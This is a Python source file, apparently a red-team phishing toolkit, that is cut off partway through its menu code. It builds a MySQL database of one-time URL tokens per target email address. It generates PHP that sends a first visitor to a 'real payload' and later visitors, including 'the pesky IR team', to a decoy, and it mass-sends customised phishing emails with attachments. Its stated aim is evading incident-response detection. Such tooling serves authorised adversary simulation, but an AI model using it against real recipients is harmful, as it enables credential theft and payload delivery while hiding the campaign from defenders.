#!/bin/python
# Script created by Jesse Nebling (@bashexplode)
# A toolkit that creates and interacts with mysql, generates one-time URL tokens, generates PHP code that
# should be placed on the dedicated web server where one-time URL token use is desired, and sends emails to victims.
#
# This script is to evade IR detection on red teaming engagements, so if a connection string to a payload is discovered
# it will no longer be valid and will redirect an IR team to an arbitrary website or fake payload.

import MySQLdb
import subprocess
import string
import csv
import os
import sys
import time
import random
import readline
import re
import smtplib
import traceback
from email.mime.text import MIMEText
import pickle
import base64
from googleapiclient.discovery import build
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request
from googleapiclient import errors, discovery
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from datetime import datetime
from email import encoders

readline.parse_and_bind("tab: complete")


def cmdline(command): # was annoyed at os.system output so pulled this
    process = subprocess.Popen(
        args=command,
        stdout=subprocess.PIPE,
        shell=True
    )
    return process.communicate()[0]


# Class created by Jesse Nebling (@bashexplode)
# A script that creates a mysql database
class mysqldbcreation:
    def __init__(self, user, pwd, db, outfile):
        self.user = user
        self.password = pwd
        self.db = db
        self.outfile = outfile

    def networkcheck(self):
        # Check if skip-networking is in ~/.my.cnf
        # If not add it so we're not exposing our mysql dbs on the internet
        print("[*] Checking if my.cnf is in the standard location..")
        if cmdline("ls /etc/mysql/my.cnf"):
            if "[mysqld]" not in cmdline("cat /etc/mysql/my.cnf").decode("utf-8").split("\n"):
                print("[+] Adding msqld group tag to my.cnf.")
                cmdline("echo [mysqld] >> /etc/mysql/my.cnf")
            if "skip-networking" not in cmdline("cat /etc/mysql/my.cnf").decode("utf-8").split("\n"):
                print("[!] Security first kiddies.")
                print("[+] Adding skip-networking flag under [mysqld] group in my.cnf")
                cmdline("sed -i '/\[mysqld\]/a skip-networking' /etc/mysql/my.cnf")
        else:
            print("I wrote this for Debian distros, your mysql conf file is not in the spot for those distros \
            [/etc/mysql/my.cnf]")
            print("If you continue your mysql database will be exposed to the the network.")
            continue_prompt = input("Would you like to continue? (y/N): ")
            if not continue_prompt.lower() == 'yes' and not continue_prompt.lower() == 'y':
                exit()

    def runcheck(self):
        # Script should be run as user who can start and interact with mysql
        # Check if mysql is running, if not start it up
        print("[*] Checking if MySQL is running...")
        msqlr = cmdline("sudo /bin/netstat -al").decode("utf-8").split('\n')
        mysqlrunning = False
        for line in msqlr:
            if "LISTENING" in line and "/var/run/mysqld/mysqld.sock" in line:
                mysqlrunning = True
        if mysqlrunning:
            print("[+] MySQL is running.")
            cmdline('sudo service mysql restart')
        else:
            print("[-] MySQL is not running.")
            print("[*] Starting MySQL.")
            cmdline('sudo service mysql start')
            print("[+] MySQL started.")

    def dbusercheck(self):
        conn = MySQLdb.connect(host="localhost")
        check_user_exist_sql = "select user from mysql.user where user='%s'" % self.user
        cursor = conn.cursor()
        cursor.execute(check_user_exist_sql)
        result = cursor.fetchone()
        if result:
            print("[+] %s user already exists, moving on." % self.user)
        else:
            print("[-] %s user does not exist." % self.user)
            print("[*] Creating %s database user..." % self.user)
            sql = "CREATE USER '%s'@'localhost' IDENTIFIED BY '%s'" % (self.user, self.password)
            cursor.execute(sql)
            print("[+] %s database user created." % self.user)

    def dbuserpermcheck(self):
        conn = MySQLdb.connect(host="localhost")
        check_user_perms_sql = "show grants for '%s'@'localhost'" % self.user
        cursor = conn.cursor()
        cursor.execute(check_user_perms_sql)
        result = cursor.fetchall()
        permission_binary = False
        for permrecord in result:
            if "ALL" in permrecord[0] and "otu" in permrecord[0]:
                permission_binary = True
        if permission_binary:
            print("[+] %s user already has sufficient permission to the %s database, moving on." % (self.user, self.db))
        else:
            print("[-] %s user does not have sufficient permission to the %s database." % (self.user, self.db))
            print("[*] Granting %s database user permission..." % self.user)
            sql = "GRANT ALL PRIVILEGES ON %s.* TO '%s'@'localhost'" % (self.db, self.user)
            cursor.execute(sql)
            print("[+] Full permission granted to %s database user for the %s database." % (self.user, self.db))

    def dbcheck(self):
        check_db_exist_sql = "select count(*) from information_schema.SCHEMATA \
                                where SCHEMA_NAME='%s';" \
                               % self.db

        # verify whether db exists
        conn = MySQLdb.connect(host="localhost")
        try:
            print("[*] Checking if %s database exists..." % self.db)
            cursor = conn.cursor()
            cursor.execute(check_db_exist_sql)
            number = cursor.fetchone()
            if number[0] == 0:
                print("[-] %s database does not exist." % self.db)
                print("[*] Creating %s database..." % self.db)
                sql = 'CREATE DATABASE IF NOT EXISTS %s' % self.db
                cursor.execute(sql)
                print("[+] %s database created." % self.db)
        except TypeError:
            print("[!] Invalid username and/or password was used for MySQL database.")

    def tablecheck(self):
        check_table_exist_sql = "SELECT * FROM information_schema.tables WHERE table_name = 'tokens'"

        conn = MySQLdb.connect(host="localhost", db=self.db)
        try:
            cursor = conn.cursor()
            print("[*] Checking if tokens table exists...")
            cursor.execute(check_table_exist_sql)
            if cursor.fetchone():
                print("[+] tokens table exists")
            else:
                print("[-] tokens table does not exist.")
                print("[*] Creating tokens table...")
                sql = 'CREATE TABLE tokens (id INTEGER UNSIGNED NOT NULL, token CHAR(40) NOT NULL, user VARCHAR(45), ' \
                      'emailAddress VARCHAR(45), createdTstamp INTEGER UNSIGNED NOT NULL, firstExecutedTstamp INTEGER ' \
                      'UNSIGNED, timesExecuted INTEGER UNSIGNED, PRIMARY KEY(token)); '
                cursor.execute(sql)
                print("[+] tokens table created.")
        except TypeError:
            print("[!] Invalid username and/or password was used for MySQL database.")

            # Test data sql = "INSERT INTO tokens (id, token, user, createdTstamp) VALUES ('0', 'testtesttesttesttest',
            # '123456790abcdefghijklmnopqrstuvwxyz', '1234567890');" cursor.execute(sql) conn.commit() print("[+]
            # Test data inserted into tokens table.")

    def clearall(self):
        cmdline("sed -i 's/skip-networking//' /etc/mysql/my.cnf")
        conn = MySQLdb.connect(host="localhost")
        drop_bombs = "DROP DATABASE %s" % self.db
        cursor = conn.cursor()
        cursor.execute(drop_bombs)
        print("[!] Bombs dropped.")
        conn = MySQLdb.connect(host="localhost")
        eradicate_user = "DROP USER IF EXISTS '%s'@'localhost'" % self.user
        cursor = conn.cursor()
        cursor.execute(eradicate_user)
        print("[!] User eradicated.")


    def exportdb(self):
        print("[*] Exporting otu database...")
        conn = MySQLdb.connect(host="localhost", db=self.db)
        crsr = conn.cursor()
        crsr.execute("SELECT * FROM tokens")
        header = "ID,Token,User,EmailAddress,TokenCreated,TokenExecuted,TimesExecuted\n"
        f = open(self.outfile, "w")
        f.write(header)
        f.close()
        with open(self.outfile, 'a') as f:
            writer = csv.writer(f)
            for row in crsr.fetchall():
                writer.writerow(row)
        cwd = os.getcwd()
        print("[+] File written to %s/%s" % (cwd, self.outfile))

    def displaydb(self):
        conn = MySQLdb.connect(host="localhost", db=self.db)
        cursor = conn.cursor()
        sql = "SELECT * FROM tokens"
        cursor.execute(sql)
        conn.commit()
        results = cursor.fetchall()

        widths = []
        columns = []
        tavnit = '|'
        separator = '+'

        for cd in cursor.description:
            widths.append(max(cd[2], len(cd[0])))
            columns.append(cd[0])

        for w in widths:
            tavnit += " %-" + "%ss |" % (w,)
            separator += '-' * w + '--+'

        print(separator)
        print(tavnit % tuple(columns))
        print(separator)
        for row in results:
            print(tavnit % row)
        print(separator)

    def getrowcount(self):
        if self.user:
            conn = MySQLdb.connect(host="localhost", user=self.user, passwd=self.password, db=self.db)
        else:
            conn = MySQLdb.connect(host="localhost", db=self.db)
        cursor = conn.cursor()
        sql = "SELECT COUNT(*) FROM tokens"
        cursor.execute(sql)
        conn.commit()
        results = cursor.fetchall()
        return int(results[0][0])


# Class created by Jesse Nebling (@bashexplode)
# A script generates a one time use token, inserts into a mysql database, and outputs the URL.
class OTU:
    def __init__(self, id, user, pwd, db, username, emailaddr):
        self.user = user
        self.password = pwd
        self.db = db
        self.username = username
        self.token = None
        self.timestamp = None
        self.emailaddr = emailaddr
        self.id = id

    def generate(self):
        print("[+] Generating token and saving timestamp for %s email address." % self.emailaddr)
        self.timestamp = int(time.time())
        self.token = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(40))

    def dbinsert(self):
        conn = MySQLdb.connect(host="localhost", db=self.db)
        sql = "INSERT INTO tokens (id, token, user, emailAddress, createdTstamp, timesExecuted) VALUES ('%s', '%s', '%s', '%s', "\
              "'%s', '0');" % (self.id, self.token, self.username, self.emailaddr, self.timestamp)
        cursor = conn.cursor()
        cursor.execute(sql)
        print("[+] Inserting data into %s database" % self.db)
        conn.commit()

    def displayURL(self):
        print("[+] URL standard format:")
        print("http://yourdomain.com/otu.php?param=%s\n" % self.token)


# Class created by Jesse Nebling (@bashexplode)
# A script that generates a php file to redirect users to one time payloads
class OTUPHP:
    def __init__(self, user, pwd, db, expire, primeredirect, otherredirect, times, outfile, urlparam, notokenpage):
        self.user = user
        self.password = pwd
        self.db = db
        self.redirectone = primeredirect
        self.redirecttwo = otherredirect
        self.expiry = expire
        self.times = times
        self.outfile = outfile
        self.phpfile = ""
        self.urlparam = urlparam
        self.notokenpage = notokenpage

    def generate(self):
        self.phpfile = """<?php
$servername = "localhost";
$user = "%s";
$password = "%s";
$dbname = "%s";
$param = "%s";

$conn = new mysqli($servername, $user, $password, $dbname);
if ($conn->connect_errno) {
        echo "Failed to connect to MySQL: (" . $mysqli->connect_errno . ") " . $mysqli->connect_error;
}

// retrieve token
if (isset($_GET[$param]) && preg_match('/^[0-9A-Za-z]{40}$/i', $_GET[$param])) {
        $token = $_GET[$param];
        //echo "token was set"."<br>";;
}
else {
        //echo "token not set"."<br>";
        // +======== REPLACE LINK HERE =========+
        header( 'Location: %s' );
        throw new Exception("Valid token not provided.");
}

// verify token
$query = "SELECT user, createdTstamp, timesExecuted FROM tokens WHERE token = '$token'";
$result = $conn->query($query);
$row = $result -> fetch_row();
$result->close();

if ($row) {
        //echo "token was verified"."<br>";
        $timesExecuted = (int) $row[2]; // timeExecuted
        $createdTstamp = (int) $row[1]; // createdTstamp
        //echo $row[0] . "<br>"; // user
}
else {
        //echo "token is not valid" . "<br>";
        // +======== REPLACE LINK HERE =========+
        header( 'Location: %s' );
        throw new Exception("Valid token not provided.");
}

// set timestamp to update db on first executed time and perform time check
$timestamp = time();
$delta = %s;

if ($_SERVER["REQUEST_TIME"] - $createdTstamp > $delta) {
    // +======== REPLACE LINK HERE =========+
    // do other action, like redirect to fake payload
    header( 'Location: %s' );
    throw new Exception("Token has expired.");
}

// check if the token was ever used
if ($timesExecuted <= %s) {
        //echo "Never executed";

        // Add the first executed time stamp to db
        $query = $conn->prepare("UPDATE tokens SET firstExecutedTstamp = ? WHERE token = ?");
        $query->bind_param('is', $tstamp, $tokes);
        $tstamp = $timestamp;
        $tokes = $token;
        $query->execute();
        $query->close();

        //Add counter so the token can't be used more than once
        $query = $conn->prepare("UPDATE tokens SET timesExecuted = timesExecuted + 1 WHERE token = ?");
        $query->bind_param('s', $tokes);
        $tokes = $token;
        $query->execute();
        $query->close();

        // +======== REPLACE LINK HERE =========+
        // do one-time action here, like redirecting to real payload
        header( 'Location: %s' );
}
else {
        //echo "Executed " . $row[2] . " times";

        //Add counter to see how many times the user or the pesky IR team tries to execute
        $query = $conn->prepare("UPDATE tokens SET timesExecuted = timesExecuted + 1 WHERE token = ?");
        $query->bind_param('s', $tokes);
        $tokes = $token;
        $query->execute();
        $query->close();

        // +======== REPLACE LINK HERE =========+
        // do other action, like redirect to fake payload
        header( 'Location: %s' );
}

?>""" % (self.user, self.password, self.db, self.urlparam, self.notokenpage, self.notokenpage, self.expiry, self.redirecttwo, self.times, self.redirectone, self.redirecttwo)

    def display(self):
        print(self.phpfile)

    def writetofile(self):
        php_file = open(self.outfile, "w")
        php_file.write(self.phpfile)
        php_file.close()
        cwd = os.getcwd()
        print("[+] File written to %s/%s" % (cwd, self.outfile))
        print("[*] Please manually copy and paste the code into the web page you wish to redirect from\n")


# Ripped, modified, and turned into a class from mass_email.py by Clinton Mueller, which was based on sendmail.rb
class Sendmail:
    def __init__(self, username, password, dbname, sendids, addr_from, smtp_pass, subject, smtpsrv, smtpport, messagef, url, url_param, attachment, gapi, tokenfile):
        self.addr_from = addr_from
        self.smtp_pass = smtp_pass
        self.subject = subject
        self.smtp_server = smtpsrv
        self.smtp_port = smtpport
        self.message_file = messagef
        self.URL = url
        self.url_param = url_param
        self.attachment = attachment
        self.username = username
        self.password = password
        self.dbname = dbname
        self.sendids = sendids
        self.gapi = gapi
        self.token_file = tokenfile

    def check(self):
        # Check if the emails, message, and attachment files exist
        if not os.path.exists(self.message_file):
            raise ValueError("[-] The message file " + self.message_file + " does not exist.")
        if not self.addr_from:
            raise ValueError("[-] smtp_sender_email is not set.")
        if self.gapi:
            if not self.token_file:
                raise ValueError("[-] token_file is not set.")
        else:
            if not self.smtp_pass:
                raise ValueError("[-] smtp_password is not set.")
        if not self.subject:
            raise ValueError("[-] subject is not set.")
        if not self.URL:
            raise ValueError("[-] URL is not set.")
        if self.attachment:
            if not os.path.exists(self.attachment):
                raise ValueError("[-] The attachment " + self.attachment + " does not exist.")

    def executesend(self):
        # Split the sendids variable into single values in a list for db digestion
        sendto = []
        if self.sendids == "all":
            dbaction = mysqldbcreation(self.username, self.password, self.dbname, None)
            rowcount = dbaction.getrowcount()
            if rowcount == 1:
                self.sendids = "1"
            else:
                self.sendids = "1-" + str(rowcount)

        if "," in self.sendids:
            sendto = self.sendids.split(',')
            for id in sendto:
                if '-' in id:
                    sendto.remove(id)
                    idrange = id.split("-")
                    start = int(idrange[0])
                    end = int(idrange[1]) + 1
                    for i in range(start, end, 1):
                        sendto.append(str(i))
        elif "-" in self.sendids:
            idrange = self.sendids.split('-')
            start = int(idrange[0])
            end = int(idrange[1]) + 1
            for i in range(start, end, 1):
                sendto.append(str(i))
        else:
            sendto = self.sendids

        if self.username:
            conn = MySQLdb.connect(host="localhost", user=self.username, passwd=self.password, db=self.dbname)
        else:
            conn = MySQLdb.connect(host="localhost", db=self.dbname)

        # Send uniq message for each person
        for sendid in sendto:
            try:
                crsr = conn.cursor()
                crsr.execute("SELECT * FROM tokens WHERE id = '%s'" % str(sendid))
                record = crsr.fetchall()
                token = record[0][1]
                user = record[0][2]
                emailaddr = record[0][3]
                customizedmessage = self.customMessage(token, user)

                if self.gapi:
                    self.sendMessageGAPI(emailaddr, customizedmessage)
                else:
                    self.sendMessage(emailaddr, customizedmessage)
            except TypeError:
                print("[!] Error on send_id %s" % sendid)
                print("[!] Invalid username and/or password was used for MySQL database.")
                traceback.print_exc()

    # Function to send the emails
    def sendMessageGAPI(self, email, message):
        print("made it into gapi send")

        SCOPES = ['https://www.googleapis.com/auth/gmail.send']

        creds = None

        if os.path.exists(self.token_file):
            print("token exists")
            with open(str(self.token_file), 'rb') as token:
                creds = pickle.load(token)
                print("token loaded")
        # If there are no (valid) credentials available, let the user log in.
        if not creds or not creds.valid:
            print("creds not valid?")
            if creds and creds.expired and creds.refresh_token:
                creds.refresh(Request())
            else:
                flow = InstalledAppFlow.from_client_secrets_file(
                    'credentials.json', SCOPES)
                creds = flow.run_local_server(port=0)
            # Save the credentials for the next run
            with open(self.token_file, 'wb') as token:
                pickle.dump(creds, token)

        print("moving on?")

        service = build('gmail', 'v1', credentials=creds)

        msg = MIMEMultipart()
        msg["To"] = email
        msg["From"] = self.addr_from
        msg["Date"] = str(datetime.now())
        msg["Subject"] = self.subject

        html = MIMEText(message, "html")

        # Add attachment if there is one
        if self.attachment:
            part = MIMEBase('application', "octet-stream")
            part.set_payload(open(self.attachment, "rb").read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition',
                            'attachment; filename="{0}"'.format(os.path.basename(self.attachment)))
            msg.attach(part)

        msg.attach(html)

        raw = base64.urlsafe_b64encode(msg.as_string().encode('utf-8'))
        raw = raw.decode('utf-8')
        body = {'raw': raw}

        print('[*] Sending email')
        try:
            message = (service.users().messages().send(userId="me", body=body)
                       .execute())
            print('[+] Message Sent Id: %s' % message['id'])
            # return message
        except errors.HttpError as error:
            print('An error occurred: %s' % error)
            print("[!] Message could not be sent. Check token_file, and smtp_sender_email.")

        print("Sent email to: " + email + " at " + str(datetime.now()))

    # Function to send the emails without api
    def sendMessage(self, email, message):
        msg = MIMEMultipart()
        msg["To"] = email
        msg["From"] = self.addr_from
        msg["Date"] = str(datetime.now())
        msg["Subject"] = self.subject

        html = MIMEText(message, "html")

        # Add attachment if there is one
        if self.attachment:
            part = MIMEBase('application', "octet-stream")
            part.set_payload(open(self.attachment, "rb").read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment; filename="{0}"'.format(os.path.basename(self.attachment)))
            msg.attach(part)

        msg.attach(html)

        try:
            smtp_conn = smtplib.SMTP(self.smtp_server + ":" + self.smtp_port)
            smtp_conn.starttls()
            smtp_conn.login(self.addr_from, self.smtp_pass)
            smtp_conn.sendmail(self.addr_from, email, msg.as_string())
            smtp_conn.quit()
        except:
            print("[!] Message could not be sent. Check smtp_server, smtp_port, smtp_sender_email, and smtp_pass.")

        print("Sent email to: " + email + " at " + str(datetime.now()))

    # Function to customize the message and replace url and name placeholders
    def customMessage(self, toke, user):

        newmsg = ""
        URLr = self.URL + "?" + self.url_param + "=" + toke

        try:
            with open(self.message_file, "r") as f:
                newmsg = f.read()
            newmsg = newmsg.replace("#{url}", URLr)
            newmsg = newmsg.replace("#{name}", user)
        except:
            print("[!] There was an error trying to read the file: " + self.message_file)

        return newmsg


# Class created by Jesse Nebling (@bashexplode)
# A script that takes a list of emails and users, generates a one-time use token for each, and uploads to MySQL db.
class sendmailuploader:
    def __init__(self, username, password, dbname, emails, users):
        self.username = username
        self.password = password
        self.dbname = dbname
        self.emaillist = emails
        self.userlist = users
        self.addresses = []
        self.users = []
        self.enableusers = False

    def emailsusersList(self):
        try:
            with open(self.emaillist, "r") as f:
                for line in f:
                    if "@" in line:
                        self.addresses.append(line.rstrip())

        except:
            print("[!] There was an error trying to read the file: " + self.emaillist)

        if self.userlist:
            try:
                with open(self.userlist, "r") as f:
                    for line in f:
                        self.users.append(line.rstrip())

            except:
                print("[!] There was an error trying to read the file: " + self.userlist)

    def emailtouser(self):
        self.users = []
        for u in self.addresses:
            if "." in u.split('@')[0]:
                self.users.append(" ".join(u.split('@')[0].title().split('.')))
            else:
                self.users.append(u.split('@')[0].title())

    def filecheck(self):
        print("[*] Checking if email file exists")
        if not os.path.exists(self.emaillist):
            try:
                raise ValueError("[!]" + self.emaillist + " does not exists.")
            except ValueError:
                print("[!] " + self.emaillist + " does not exists.")
        else:
            print("[+] " + self.emaillist + " exists.")

    def checks(self):
        self.filecheck()
        print("[*] Validating input file(s)...")
        self.emailsusersList()
        print("[+] Input file(s) validated.")
        if self.userlist:
            if len(self.users) == len(self.addresses):
                self.enableusers = True
            else:
                print("[-] User file and email file have different amount of lines, defaulting to email list for users.")
                self.emailtouser()
        else:
            self.emailtouser()

    def upload(self):
        print("\n")
        try:
            dbaction = mysqldbcreation(self.username, self.password, self.dbname, None)
            rowcount = dbaction.getrowcount() + 1
            for i in range(len(self.addresses)):
                otugenerator = OTU(rowcount, self.username, self.password, self.dbname, self.users[i], self.addresses[i])
                otugenerator.generate()
                otugenerator.dbinsert()
                otugenerator.displayURL()
                rowcount = rowcount + 1
        except TypeError:
            print("[!] Invalid username and/or password was used for MySQL database.")
        except MySQLdb.Error:
            print("[!] Invalid database, the dbname '%s' does not exist." % self.dbname)
        try:
            dbaction = mysqldbcreation(self.username, self.password, self.dbname, None)
            dbaction.displaydb()
        except TypeError:
            print("[!] Invalid username and/or password was used for MySQL database.")
        except MySQLdb.Error:
            print("[!] Invalid database, the dbname '%s' does not exist." % self.dbname)


# Pulled and modified class from stackoverflow
# https://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input
class Completer(object):
    def __init__(self, commands, currvars):
        self.COMMANDS = commands
        self.RE_SPACE = re.compile('.*\s+$', re.M)
        self.currvars = currvars

    def _listdir(self, root):
        # "List directory 'root' appending the path separator to subdirs."
        res = []
        for name in os.listdir(root):
            path = os.path.join(root, name)
            if os.path.isdir(path):
                name += os.sep
            res.append(name)
        return res

    def _complete_path(self, path=None):
        # "Perform completion of filesystem path."
        if not path:
            return self._listdir('.')
        dirname, rest = os.path.split(path)
        tmp = dirname if dirname else '.'
        res = [os.path.join(dirname, p)
                for p in self._listdir(tmp) if p.startswith(rest)]
        # more than one match, or single match which does not exist (typo)
        if len(res) > 1 or not os.path.exists(path):
            return res
        # resolved to a single directory, so return list of files below it
        if os.path.isdir(path):
            return [os.path.join(path, p) for p in self._listdir(path)]
        # exact file match terminates this completion
        return [path + ' ']

    def complete_user_file(self, args):
        # "Completions for the 'user_file' command."
        if not args:
            return self._complete_path('.')
        # treat the last arg as a path and complete it
        return self._complete_path(args[-1])

    def complete_attachment(self, args):
        # "Completions for the 'attachment' command."
        if not args:
            return self._complete_path('.')
        # treat the last arg as a path and complete it
        return self._complete_path(args[-1])

    def complete_email_file(self, args):
        # "Completions for the 'email_file' command."
        if not args:
            return self._complete_path('.')
        # treat the last arg as a path and complete it
        return self._complete_path(args[-1])

    def complete_message_file(self, args):
        # "Completions for the 'message_file' command."
        if not args:
            return self._complete_path('.')
        # treat the last arg as a path and complete it
        return self._complete_path(args[-1])

    def complete_set(self, args):
        if not args:
            return self.currvars
        return [x + ' ' for x in self.currvars if x.startswith(args[0])]

    def complete(self, text, state):
        # "Generic readline completion entry point."
        butter = readline.get_line_buffer()
        line = readline.get_line_buffer().split()
        # show all commands
        if not line:
            return [c + ' ' for c in self.COMMANDS][state]
        # account for last argument ending in a space
        if self.RE_SPACE.match(butter):
            line.append('')
        # resolve command to the implementation function
        if len(line) > 2:
            cmd = line[1].strip()
            if cmd in self.currvars:
                impl = getattr(self, 'complete_%s' % cmd)
                args = line[1:]
                if args:
                    return (impl(args) + [None])[state]
                return [cmd + ' '][state]
        else:
            cmd = line[0].strip()
            if cmd in self.COMMANDS:
                impl = getattr(self, 'complete_%s' % cmd)
                args = line[1:]
                if args:
                    return (impl(args) + [None])[state]
                return [cmd + ' '][state]
        results = [c + ' ' for c in self.COMMANDS if c.startswith(cmd)] + [None]
        return results[state]


class Menu:
    def __init__(self):
        # Default variable definition
        # For MySQL comms and export
        self.username = "otuplz"
        self.password = "otupassword"
        self.dbname = "otu"
        self.csv_filename = "one-time-URL-db.csv"

        # For PHP code generation
        self.phpusername = "otuplz"
        self.phppassword = "otupassword"
        self.expire = 604800
        self.redir_one = "https://www.google.com"
        self.redir_two = "https://www.wikipedia.com"
        self.times = 1
        self.php_filename = "otu.php"
        self.urlparam = "uid"
        self.no_tokenpage = "https://www.facebook.com"

        # For OTU generation
        self.otu_user = "John Doe"
        self.otu_email = "john.doe@example.com"

        # For sendmail db upload
        self.emails = None
        self.usersfile = None

        # For sendmail execution
        self.sendids = "all"
        self.message_file = None
        self.addr_from = None
        self.addr_to = None
        self.smtp_pass = None
        self.subject = None
        self.smtp_server = "smtp.office365.com"
        self.smtp_port = "587"
        self.message_file = None
        self.URL = "http://www.google.com/otu.php"
        self.attachment = None
        self.google_api = False
        self.token_file = "token.pickle"

        # Initialize dictionaries and initial menus
        self.mainmenu_actions = {}
        self.currvars = {}
        self.curractions = {}
        self.currset = None
        self.currmenu = self.main_menu
        self.module_exec = self.main_menu
        self.other_actions = {}
        self.mysqlsetup_vars = {}
        self.mysqldisplay_vars = {}
        self.mysqlexport_vars = {}
        self.mysqlnuke_vars = {}
        self.otugeneration_vars = {}
        self.phpgeneration_vars = {}

        # =======================
        #    MENUS DEFINITIONS
        # =======================

        # Main Menu definition
        self.mainmenu_actions = {
            'main_menu': self.currmenu,
            'main_prompt': self.main_menu,
            '1': self.mysqlsetupmenu,
            '2': self.otugenerationmenu,
            '3': self.phpgenerationmenu,
            '4': self.displaydbmenu,
            '5': self.exportdbmenu,
            '6': self.sendmailuploadmenu,
            '7': self.sendmailmenu,
            '911': self.nukedb,
            '42': self.test,
            '9': self.back,
            '0': self.exit,
            'exit': self.exit,
            'back': self.back,
            'info': self.banner_text,
            'show': self.banner_text,
            'options': self.banner_text,
            'something': self.banner_text,
            'help': self.banner_text
        }

        self.update_vars()
        self.banner_text()

    def initialize_menu(self):
        self.update_actions()
        self.update_vars()
        self.curractions = self.other_actions

    def update_actions(self):
        self.other_actions = {
            'execute': self.module_exec,
            'run': self.module_exec,
            'main_menu': self.currmenu,
            'set': self.set_vars,
            'exit': self.exit,
            'back': self.back,
            'home': self.back,
            'info': self.display_vars,
            'show': self.display_vars,
            'options': self.display_vars,
            'help': self.display_vars
        }

    def update_vars(self):
        self.mysqlsetup_vars = {
            'menu': "MySQL Database Setup",
            'desc': "This module creates a MySQL database with the following parameters (current user for DB access "
                    "by default). Note: Once executed the module will change the current system's MySQL configuration "
                    "file to disallow MySQL from broadcasting on the external network, the nuke option will reset the "
                    "configuration.",
            'variables': {
                'db_username': self.username,
                'db_password': self.password,
                'db_name': self.dbname
            }
        }

        self.mysqldisplay_vars = {
            'menu': "MySQL Database Display",
            'desc': "This module displays MySQL database (current user for DB access by default).",
            'variables': {
                'db_name': self.dbname
            }
        }

        self.mysqlexport_vars = {
            'menu': "MySQL Database Export",
            'desc': "This module exports MySQL database (current user for DB access by default).",
            'variables': {
                'db_username': self.username,
                'db_password': self.password,
                'db_name': self.dbname,
                'output_file': self.csv_filename
            }
        }

        self.mysqlnuke_vars = {
            'menu': "MySQL Database Export",
            'desc': "This module nukes current MySQL database (current user for DB access by default). Reverts MySQL "
                    "database configuration to system default and removes otu DB user.",
            'variables': {
                'db_username': self.username,
                'db_name': self.dbname
            }
        }

        self.otugeneration_vars = {
            'menu': "One-Time URL Generation",
            'desc': "This module generates a one-time token and URL and inserts the token into the MySQL database ("
                    "current user for DB access by default).",
            'variables': {
                'db_name': self.dbname,
                'otu_user': self.otu_user,
                'otu_email': self.otu_email
            }
        }

        self.phpgeneration_vars = {
            'menu': "PHP Generation",
            'desc': "This module generates PHP code that should be inserted into the phishing web page for "
                    "redirection (root user for DB access and one-time execution by default). The code generated "
                    "determines how long after creation the token is set to be valid (expires) [in seconds], "
                    "where the token redirects to if it has not been used yet (redirect_real), where the token "
                    "redirects to if it has been use more the n times (redirect_fake), and how many times it allows "
                    "to be executed before redirecting to the fake payload/website (n_time_execution). "
                    "If the page is browsed to without having a token set at all, the default page will be redirect_token_notset.",
            'variables': {
                'db_username': self.phpusername,
                'db_password': self.phppassword,
                'db_name': self.dbname,
                'expires': self.expire,
                'redirect_tokennotset': self.no_tokenpage,
                'redirect_real': self.redir_one,
                'redirect_fake': self.redir_two,
                'n_time_execution': self.times,
                'output_file': self.php_filename,
                'url_param': self.urlparam
            },
            'opts': "For the below options use 'set <variable> <option number>'\n\nexpires options:\n1)\t\t A "
                    "Month\n2)\t\t A Week [default]\n3)\t\t A Day\nCustom)\t\t Enter any number in seconds to set "
                    "custom token expiration time\n\nn_time_execution options:\n1)\t\t One-time use [default]\n2)\t\t "
                    "Two-times (for use with certutil)\n3)\t\t Three-times (for testing purposes) "
        }

        self.sendmailtokengenerator_vars = {
            'menu': "Sendmail Email Token Generator",
            'desc': "This module uploads a new line-separated list of emails to the OTU database and creates a token "
                    "for each individual email. The user_file should contain first and/or last names of the emails, "
                    "and must be in the same order to upload correctly. If user_file is set to None, the module will "
                    "attempt to scrape a user from the email field. DO NOT EXECUTE MORE THAN ONCE OR YOU WILL SEND "
                    "DUPLICATE EMAILS",
            'variables': {
                'db_username': self.username,
                'db_password': self.password,
                'db_name': self.dbname,
                'email_file': self.emails,
                'user_file': self.usersfile
            }
        }

        self.sendmail_vars = {
            'menu': "Sendmail with OTU",
            'desc': "This module sends a message file to selected user ids (default all, can be comma-delimited, "
                    "ranges, or both) in the %s database. If the Google Gmail Send API is being used, set to 'true' "
                    "and set the token file. Additionally, the API will ignore the smtp_password field" 
                    "" % self.dbname,
            'variables': {
                'db_username': self.username,
                'db_password': self.password,
                'db_name': self.dbname,
                'send_ids': self.sendids,
                'message_file': self.message_file,
                'subject_header': self.subject,
                'smtp_sender_email': self.addr_from,
                'smtp_password': self.smtp_pass,
                'URL': self.URL,
                'url_param': self.urlparam,
                'smtp_server': self.smtp_server,
                'smtp_port': self.smtp_port,
                'attachment': self.attachment,
                'google_api': self.google_api,
                'token_file': self.token_file
            },
            'opts': "For the below options use 'set <variable> <option number>'\n\nsmtp_server options:\n1)\t\t "
                    "smtp.office365.com\n2)\t\t smtp.mail.yahoo.com\n3)\t\t smtp.gmail.com\nCustom)\t\t Type a custom "
                    "server address to set"
        }

    def display_vars(self):
        print("\n" + ("=" * len(self.currvars['menu'])))
        print(self.currvars['menu'])
        print(("=" * len(self.currvars['menu'])) + "\n")
        if 'desc' in self.currvars.keys():
            print(self.currvars['desc'] + "\n")
        print("{:<20} {:<20}".format("Variable Name", "Current Setting"))
        print("{:<20} {:<20}".format("-------------", "---------------"))
        for i in self.currvars['variables'].keys():
            if not self.currvars['variables'][i]:
                print("{:<20} {:<20}".format(i, ""))
            else:
                print("{:<20} {:<20}".format(i, self.currvars['variables'][i]))
        if 'opts' in self.currvars.keys():
            print("\n\n" + self.currvars['opts'])
        print("\n")
        self.currmenu()

    def set_vars(self):
        variable = self.currset.split()[1]
        variable = variable.lower()
        value = " ".join((self.currset.split()[2:]))
        if variable == 'db_user' or variable == 'db_username':
            if self.currvars['menu'] == "PHP Generation":
                self.phpusername = value
            else:
                if value == "":
                    self.username = None
                else:
                    self.username = value
        elif variable == 'db_password' or variable == 'db_pass':
            if self.currvars['menu'] == "PHP Generation":
                self.phppassword = value
            else:
                if value == "":
                    self.password = None
                else:
                    self.password = value
        elif variable == 'db_name':
            if value == "":
                self.dbname = None
            else:
                self.dbname = value
        elif variable == 'otu_user':
            self.otu_user = value
        elif variable == 'otu_email':
